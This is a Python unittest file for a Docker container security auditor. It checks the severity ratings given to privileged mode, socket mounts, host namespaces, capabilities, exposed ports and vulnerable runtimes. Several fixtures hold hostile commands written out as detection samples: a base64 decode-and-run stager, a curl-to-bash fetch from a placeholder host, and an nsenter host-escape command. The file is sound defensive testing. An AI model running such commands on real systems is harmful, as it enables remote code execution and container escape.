"""Container intelligence: real risk primitives, never silent absence."""

import io
import json
import subprocess
import sys
import time
import unittest
from contextlib import redirect_stdout
from unittest.mock import patch

from jarvis.collectors.host import containers
from jarvis.core import assurance, collection


def cfg(name="c", image="alpine@sha256:" + "0" * 64, **host_overrides):
    # A hardened baseline: the flag tests below each add exactly one weakness,
    # so a clean fixture must carry none of the posture findings.
    host = {"Privileged": False, "PidMode": "", "NetworkMode": "bridge",
            "IpcMode": "", "CapAdd": None, "SecurityOpt": ["no-new-privileges:true"],
            "ReadonlyRootfs": True, "PidsLimit": 200, "Memory": 1 << 30,
            "RestartPolicy": "unless-stopped"}
    host.update(host_overrides)
    return {"Id": "abc123def456", "Name": f"/{name}",
            "Config": {"Image": image, "User": "65532:65532", "Env": [], "Cmd": ["app"]},
            "HostConfig": host, "Mounts": [], "NetworkSettings": {"Ports": {}}}


class AssessTests(unittest.TestCase):
    def test_clean_container_is_ok_with_no_findings_beyond_the_summary(self):
        rows = containers.assess(cfg())
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["severity"], "ok")

    def test_privileged_is_critical(self):
        rows = containers.assess(cfg(Privileged=True))
        self.assertEqual(rows[0]["severity"], "critical")
        self.assertIn("privileged", rows[0]["title"])

    def test_host_pid_namespace_is_high(self):
        rows = containers.assess(cfg(PidMode="host"))
        self.assertEqual(rows[0]["severity"], "high")
        self.assertIn("PID", rows[0]["title"])

    def test_host_network_namespace_is_medium(self):
        rows = containers.assess(cfg(NetworkMode="host"))
        self.assertEqual(rows[0]["severity"], "medium")

    def test_host_ipc_namespace_is_medium(self):
        rows = containers.assess(cfg(IpcMode="host"))
        self.assertEqual(rows[0]["severity"], "medium")

    def test_docker_socket_mount_is_critical_regardless_of_other_flags(self):
        c = cfg()
        c["Mounts"] = [{"Source": "/var/run/docker.sock",
                        "Destination": "/var/run/docker.sock", "RW": True}]
        rows = containers.assess(c)
        self.assertEqual(rows[0]["severity"], "critical")
        self.assertIn("Docker socket", rows[0]["title"])

    def test_docker_socket_at_alternate_path_is_also_caught(self):
        c = cfg()
        c["Mounts"] = [{"Source": "/run/docker.sock", "Destination": "/run/docker.sock",
                        "RW": True}]
        self.assertEqual(containers.assess(c)[0]["severity"], "critical")

    def test_sensitive_host_mount_readwrite_is_critical_but_readonly_is_not(self):
        for path in ("/", "/etc", "/root", "/home"):
            c = cfg()
            c["Mounts"] = [{"Source": path, "Destination": "/host", "RW": True}]
            self.assertEqual(containers.assess(c)[0]["severity"], "critical", path)
        c = cfg()
        c["Mounts"] = [{"Source": "/etc", "Destination": "/host", "RW": False}]
        self.assertEqual(containers.assess(c)[0]["severity"], "ok")

    def test_socket_source_is_detected_when_destination_is_renamed(self):
        c = cfg()
        c["Mounts"] = [{"Source": "/var/run/docker.sock", "Destination": "/api", "RW": False}]
        self.assertTrue(any("Docker socket" in row["title"] for row in containers.assess(c)))

    def test_capability_prefix_does_not_hide_dangerous_capability(self):
        self.assertEqual(containers.assess(cfg(CapAdd=["CAP_SYS_ADMIN"]))[0]["severity"], "high")

    def test_ordinary_bind_mount_is_not_flagged(self):
        c = cfg()
        c["Mounts"] = [{"Source": "/home/chris/myapp/data", "Destination": "/data", "RW": True}]
        self.assertEqual(containers.assess(c)[0]["severity"], "ok")

    def test_dangerous_capabilities_are_high_and_named_exactly(self):
        c = cfg(CapAdd=["SYS_ADMIN", "NET_RAW"])
        rows = containers.assess(c)
        self.assertEqual(rows[0]["severity"], "high")
        self.assertIn("SYS_ADMIN", rows[0]["detail"])
        self.assertIn("NET_RAW", rows[0]["detail"])

    def test_ordinary_capabilities_are_not_flagged(self):
        c = cfg(CapAdd=["CHOWN", "SETUID"])
        self.assertEqual(containers.assess(c)[0]["severity"], "ok")

    def test_public_port_is_low_and_loopback_bound_is_not_flagged(self):
        c = cfg()
        c["NetworkSettings"]["Ports"] = {
            "8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "8080"}]}
        rows = containers.assess(c)
        self.assertEqual(rows[0]["severity"], "low")
        c2 = cfg()
        c2["NetworkSettings"]["Ports"] = {
            "8080/tcp": [{"HostIp": "127.0.0.1", "HostPort": "8080"}]}
        self.assertEqual(containers.assess(c2)[0]["severity"], "ok")

    def test_unbound_hostip_defaults_to_flagged_not_assumed_safe(self):
        c = cfg()
        c["NetworkSettings"]["Ports"] = {"53/udp": [{"HostIp": "", "HostPort": "53"}]}
        self.assertEqual(containers.assess(c)[0]["severity"], "low")

    def test_multiple_risks_all_reported_not_just_the_first(self):
        c = cfg(Privileged=True, PidMode="host", CapAdd=["SYS_ADMIN"])
        rows = containers.assess(c)
        severities = {r["severity"] for r in rows}
        self.assertIn("critical", severities)
        self.assertIn("high", severities)
        self.assertEqual(len(rows), 3)


class RunHelperTests(unittest.TestCase):
    def test_run_survives_missing_binary(self):
        with patch("subprocess.Popen", side_effect=OSError("private diagnostic")):
            out, err = containers._run(["docker", "version"])
        self.assertIsNone(out)
        self.assertEqual(err, "OSError")

    def test_real_subprocess_success_and_private_failure(self):
        out, err = containers._run([sys.executable, "-c", "print('hello')"])
        self.assertEqual(out.strip(), "hello")
        self.assertIsNone(err)
        out, err = containers._run([sys.executable, "-c", "import sys; print('private'); sys.exit(3)"])
        self.assertIsNone(out)
        self.assertNotIn("private", err)

    def test_stalled_command_is_killed_with_no_retry(self):
        with patch.object(containers, "TIMEOUT_S", 0.1):
            started = time.monotonic()
            out, err = containers._run([sys.executable, "-c", "import time; time.sleep(10)"])
        self.assertIsNone(out)
        self.assertIn("time budget", err)
        self.assertLess(time.monotonic() - started, 3)

    def test_interruption_reaps_the_child_and_restores_audit_context(self):
        spawn = subprocess.Popen
        children = []
        def record(*args, **kwargs):
            child = spawn(*args, **kwargs)
            children.append(child)
            return child
        with patch("subprocess.Popen", side_effect=record), \
                patch.object(containers.selectors.DefaultSelector, "select", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                containers._run([sys.executable, "-c", "import time; print('ready', flush=True); time.sleep(10)"])
        self.assertIsNotNone(children[0].poll())
        with patch.object(containers, "_audit", side_effect=KeyboardInterrupt):
            with self.assertRaises(KeyboardInterrupt):
                containers.audit()
        self.assertIsNone(containers._deadline.get())

    def test_excessive_output_is_rejected(self):
        with patch.object(containers, "MAX_OUTPUT_BYTES", 100):
            out, err = containers._run([sys.executable, "-c", "print('x'*10000)"])
        self.assertIsNone(out)
        self.assertIn("output limit", err)

    def test_expired_audit_never_starts_another_subprocess(self):
        token = containers._deadline.set(time.monotonic() - 1)
        try:
            with patch("subprocess.Popen") as spawn:
                out, err = containers._run(["docker", "inspect", "id"])
                spawn.assert_not_called()
            self.assertIsNone(out)
            self.assertIn("exhausted", err)
        finally:
            containers._deadline.reset(token)

    def test_inspect_rejects_wrong_identity_and_malformed_shapes(self):
        for value in ([], {}, None, {"Id": "different"}, dict(cfg(), Mounts=[None]),
                      dict(cfg(), HostConfig={}), dict(cfg(), NetworkSettings={}), dict(cfg(), NetworkSettings={"Ports": {"80/tcp": [None]}})):
            with self.subTest(value=value), patch.object(containers, "_run", return_value=(json.dumps(value), None)):
                self.assertIsNone(containers.inspect("abc123"))
        with patch.object(containers, "_run", return_value=(json.dumps(cfg()), None)) as run:
            self.assertIsNotNone(containers.inspect("abc123"))
            args = run.call_args.args[0]
            self.assertIn("unix:///var/run/docker.sock", args)
            # Names only: the template never emits a variable's value.
            self.assertNotIn("json .Config.Env", args[-2])
            self.assertIn('{{json (index (split $e "=") 0)}}', args[-2])



class AuditTests(unittest.TestCase):
    def test_docker_unavailable_is_a_finding_not_a_clean_empty_list(self):
        with patch.object(containers, "daemon_state", return_value=(False, "no such file")):
            out = containers.audit()
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["severity"], "low")
        self.assertIn("unknown, not clean", out[0]["detail"])

    def test_list_failure_is_reported(self):
        with patch.object(containers, "daemon_state", return_value=(True, "29.1.3")), \
                patch.object(containers, "list_containers", return_value=(None, "permission denied")):
            out = containers.audit()
        self.assertEqual(out[0]["severity"], "low")
        self.assertIn("permission denied", out[0]["detail"])

    def test_unreadable_container_is_named_not_dropped_silently(self):
        rows = [{"id": "a1", "name": "good"}, {"id": "b2", "name": "bad"}]
        with patch.object(containers, "daemon_state", return_value=(True, "29.1.3")), \
                patch.object(containers, "list_containers", return_value=(rows, None)), \
                patch.object(containers, "inspect",
                            side_effect=lambda cid: cfg("good") if cid == "a1" else None):
            out = containers.audit()
        titles = [f["title"] for f in out]
        self.assertIn("some containers could not be inspected", titles)
        self.assertTrue(any("bad" in f["detail"] for f in out))
        self.assertNotIn("container inventory complete", titles)
        self.assertIn("container inventory incomplete", titles)

    def test_empty_fleet_is_a_clean_zero_not_an_error(self):
        with patch.object(containers, "daemon_state", return_value=(True, "29.1.3")), \
                patch.object(containers, "list_containers", return_value=([], None)):
            out = containers.audit()
        self.assertEqual(out[-1]["detail"], "0 of 0 container(s) inspected")

    def test_wrong_host_scope_returns_nothing(self):
        self.assertEqual(containers.audit(hosts=("win",)), [])

    def test_container_count_is_bounded(self):
        with patch.object(containers, "_run",
                          return_value=("\n".join(f"id{i}\tname{i}" for i in range(1000)), None)):
            rows, err = containers.list_containers()
        self.assertEqual(len(rows), containers.MAX_CONTAINERS)
        self.assertIn("limit exceeded", err)

    def test_partial_and_unavailable_receipts_do_not_claim_complete(self):
        for good, expected in ((True, "partial"), (False, "unavailable")):
            rows = [{"id": "a", "name": "good"}, {"id": "b", "name": "bad"}]
            with collection.observe() as observation, \
                    patch.object(containers, "daemon_state", return_value=(True, "29")), \
                    patch.object(containers, "list_containers", return_value=(rows, None)), \
                    patch.object(containers, "inspect", side_effect=[cfg() if good else None, None]):
                out = containers.audit()
            self.assertEqual(observation.status, expected)
            self.assertNotIn("container inventory complete", [f["title"] for f in out])

    def test_truncation_receipt_is_partial(self):
        with collection.observe() as observation, \
                patch.object(containers, "daemon_state", return_value=(True, "29")), \
                patch.object(containers, "list_containers", return_value=([{"id": "a", "name": "a"}], "limit exceeded")), \
                patch.object(containers, "inspect", return_value=cfg()):
            out = containers.audit()
        self.assertEqual(observation.status, "partial")
        self.assertIn("container inventory truncated", [f["title"] for f in out])

    def test_scheduled_job_carries_observation_failure(self):
        from jarvis.service import jobs, schedule
        self.assertEqual(schedule.JOBS["containers"][0], 900)
        with collection.observe() as observation, \
                patch.object(containers, "daemon_state", return_value=(False, "unreachable")):
            out = jobs.run_job("containers", ("wsl",), "/unused")
        self.assertEqual(observation.status, "unavailable")
        self.assertTrue(out)

    def test_coverage_names_missing_and_stale_container_receipts(self):
        from unittest.mock import MagicMock

        from jarvis.service import coverage
        store = MagicMock()
        store.get_meta.return_value = ""
        for snaps, title in (({}, "has never produced"),
                             ({"containers": {"ts": time.time() - 2000}}, "is stale"),
                             ({"containers": {"ts": time.time(), "error": "inspect unavailable"}}, "is failing")):
            store.get_snapshots.return_value = snaps
            with patch.object(coverage, "Store", return_value=store):
                findings = coverage.job_health("/unused")
            self.assertTrue(any(f.get("about_collector") == "containers" and title in f["title"] for f in findings))

    def test_cli_dispatches_json_and_preserves_selected_scope(self):
        from jarvis.cli.parser import build_parser
        args = build_parser().parse_args(["--host", "wsl", "containers", "--json"])
        with patch.object(containers, "audit", return_value=[{"severity": "ok"}]) as audit, redirect_stdout(io.StringIO()) as stdout:
            args.fn(args, None)
        self.assertEqual(json.loads(stdout.getvalue()), [{"severity": "ok"}])
        self.assertEqual(audit.call_args.kwargs["hosts"], ("wsl",))

    def test_assurance_does_not_promote_fresh_inventory_to_validation(self):
        cap = assurance.report({"containers": {"status": "complete"}})["capabilities"]["container_inventory"]
        self.assertEqual(cap["implementation"], "unverified")
        self.assertEqual(cap["live_telemetry"], "current")
        self.assertIsNone(cap["last_validation"])
        self.assertFalse(cap["validated_containment"])



class LiveIntegrationTests(unittest.TestCase):
    """Skips cleanly where Docker isn't available; runs the real path otherwise."""

    def test_live_audit_never_reports_clean_when_docker_is_unreachable(self):
        available, _detail = containers.daemon_state()
        if not available:
            self.skipTest("Docker not available in this environment")
        out = containers.audit()
        self.assertTrue(out)
        self.assertTrue(all("severity" in f and "detail" in f for f in out))


if __name__ == "__main__":
    unittest.main()


class PostureTests(unittest.TestCase):
    """How far an attacker gets once inside, and how the container could have
    been poisoned (DOCKER-ATTACK-SURFACE-2026-10-23)."""

    def titles(self, c, **kw):
        return {f["title"]: f for f in containers.assess(c, **kw)}

    def hardened(self, **over):
        return cfg(image="nats@sha256:" + "a" * 64, **over)

    def test_a_hardened_container_has_no_posture_findings(self):
        out = self.titles(self.hardened())
        self.assertEqual([t for t in out if out[t]["severity"] != "ok"], [])

    def test_root_writable_unlimited_latest_container_lists_each_weakness_low_or_medium(self):
        c = cfg(image="ghcr.io/x/core:latest")
        c["Config"].update({"User": "", "Env": [], "Cmd": ["server"]})
        c["HostConfig"].update({"RestartPolicy": "always", "PidsLimit": None, "Memory": 0,
                                "ReadonlyRootfs": False, "SecurityOpt": []})
        out = self.titles(c)
        self.assertEqual(out["container runs as root"]["severity"], "medium")
        self.assertEqual(out["container has no resource limits"]["severity"], "low")
        self.assertEqual(out["image pulled by a mutable tag"]["severity"], "low")
        self.assertEqual(out["container root filesystem is writable"]["severity"], "low")
        self.assertEqual(out["root container restarts unconditionally"]["severity"], "low")
        self.assertIn("container allows privilege gain through setuid binaries", out)

    def test_seccomp_unconfined_is_high_and_names_copy_fail(self):
        out = self.titles(self.hardened(SecurityOpt=["seccomp=unconfined"]))
        hit = out["container runs without the seccomp filter"]
        self.assertEqual(hit["severity"], "high")
        self.assertIn("CVE-2026-31431", hit["detail"])

    def test_host_pid_with_ptrace_is_an_escape(self):
        out = self.titles(self.hardened(PidMode="host", CapAdd=["SYS_PTRACE"]))
        self.assertEqual(out["container can trace host processes"]["severity"], "critical")

    def test_secret_env_names_are_reported_without_values(self):
        c = self.hardened()
        c["Config"]["Env"] = ["POSTGRES_PASSWORD=hunter2", "CLOUDFLARE_TUNNEL_TOKEN=eyJ...", "PATH=/bin"]
        hit = self.titles(c)["secrets live in the container environment"]
        self.assertEqual(hit["severity"], "medium")
        self.assertIn("POSTGRES_PASSWORD", hit["detail"])
        self.assertNotIn("hunter2", hit["detail"])
        self.assertNotIn("eyJ", hit["detail"])

    def test_stager_shaped_command_is_high(self):
        c = self.hardened()
        c["Config"]["Cmd"] = ["sh", "-c", "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHN0YWdlcg== | base64 -d | sh"]
        self.assertEqual(self.titles(c)["container command is a decode-and-run stager"]["severity"], "high")
        c["Config"]["Cmd"] = ["sh", "-c", "curl -fsSL http://x/i.sh | bash"]
        self.assertIn("container command is a decode-and-run stager", self.titles(c))
        c["Config"]["Cmd"] = ["sh", "-c", "exec nginx -g 'daemon off;'"]
        self.assertNotIn("container command is a decode-and-run stager", self.titles(c))

    def test_tunnel_client_is_named_as_internet_exposure(self):
        c = self.hardened()
        c["Config"]["Image"] = "cloudflare/cloudflared@sha256:" + "b" * 64
        c["Config"]["Env"] = ["TUNNEL_TOKEN=x"]
        out = self.titles(c)
        self.assertEqual(out["container opens an inbound tunnel from the internet"]["severity"], "medium")

    def test_old_image_is_medium_and_fresh_is_quiet(self):
        now = 1_800_000_000
        out = self.titles(self.hardened(), now=now, image_info={"created": now - 500 * 86400, "digests": []})
        self.assertEqual(out["image is more than a year old"]["severity"], "medium")
        out = self.titles(self.hardened(), now=now, image_info={"created": now - 30 * 86400, "digests": []})
        self.assertNotIn("image is more than a year old", out)


class HostPostureTests(unittest.TestCase):
    def titles(self, **kw):
        return {f["title"]: f for f in containers.host_posture(**kw)}

    def test_docker_group_tcp_listener_and_defaults(self):
        out = self.titles(info={"SecurityOptions": ["name=seccomp,profile=builtin", "name=cgroupns"],
                                "LiveRestoreEnabled": False},
                          group=["chris"], listeners=["0.0.0.0:2375"], versions={}, daemon_json=None)
        self.assertEqual(out["docker group grants root-equivalent control"]["severity"], "medium")
        self.assertIn("chris", out["docker group grants root-equivalent control"]["detail"])
        self.assertEqual(out["Docker API listens on TCP"]["severity"], "critical")
        self.assertEqual(out["container root is host root"]["severity"], "medium")
        self.assertEqual(out["no mandatory access control for containers"]["severity"], "low")
        self.assertEqual(out["live-restore is off"]["severity"], "low")
        self.assertEqual(out["daemon runs on defaults"]["severity"], "low")
        self.assertNotIn("default seccomp profile is not active", out)

    def test_tls_port_is_high_and_userns_quiets_root_mapping(self):
        out = self.titles(info={"SecurityOptions": ["name=seccomp,profile=builtin", "name=userns",
                                                    "name=apparmor"]},
                          group=[], listeners=["0.0.0.0:2376"], versions={}, daemon_json={"no-new-privileges": True})
        self.assertEqual(out["Docker API listens on TCP"]["severity"], "high")
        self.assertNotIn("container root is host root", out)
        self.assertNotIn("no mandatory access control for containers", out)
        self.assertNotIn("no-new-privileges is not the default", out)

    def test_known_vulnerable_runtime_versions_are_named_and_fixed_ones_quiet(self):
        out = self.titles(info={}, group=[], listeners=[],
                          versions={"runc": "runc version 1.2.7", "containerd": "containerd 2.2.1",
                                    "docker": "29.1.3"})
        self.assertEqual(out["runc runc version 1.2.7 has a known container-escape or bypass bug"]["severity"], "critical")
        self.assertEqual(out["containerd containerd 2.2.1 has a known container-escape or bypass bug"]["severity"], "high")
        self.assertEqual(out["docker 29.1.3 has a known container-escape or bypass bug"]["severity"], "medium")
        out = self.titles(info={}, group=[], listeners=[],
                          versions={"runc": "1.3.3-0ubuntu1", "containerd": "2.2.4", "docker": "29.5.1"})
        self.assertEqual([t for t in out if "known container-escape" in t], [])
        self.assertEqual(containers._version("garbage"), None)

    def test_plain_registry_logins_without_a_helper_are_medium(self):
        out = self.titles(info={}, group=[], listeners=[], versions={},
                          docker_config={"auths": ["registry.example"], "credsStore": None, "credHelpers": None})
        self.assertEqual(out["registry credentials stored unencrypted"]["severity"], "medium")
        out = self.titles(info={}, group=[], listeners=[], versions={},
                          docker_config={"auths": ["registry.example"], "credsStore": "pass", "credHelpers": None})
        self.assertNotIn("registry credentials stored unencrypted", out)


class EventTests(unittest.TestCase):
    def test_exec_and_create_events_are_judged(self):
        rows = [
            {"Type": "container", "Action": "create", "Actor": {"ID": "a" * 64, "Attributes": {"name": "web", "image": "nginx:1.27"}}},
            {"Type": "container", "Action": "exec_create: sh -c id", "Actor": {"ID": "a" * 64, "Attributes": {"name": "web"}}},
            {"Type": "container", "Action": "exec_create: nsenter -t 1 -m sh", "Actor": {"ID": "b" * 64, "Attributes": {"name": "db"}}},
            {"Type": "network", "Action": "connect", "Actor": {"ID": "c", "Attributes": {}}},
        ]
        out = {f["title"]: f for f in containers.judge_events(rows)}
        self.assertEqual(out["escape-shaped command executed inside db"]["severity"], "high")
        self.assertEqual(out["2 command(s) executed inside containers"]["severity"], "low")
        self.assertIn("web (nginx:1.27)", out["1 container(s) created"]["detail"])
        self.assertEqual(containers.judge_events([]), [])
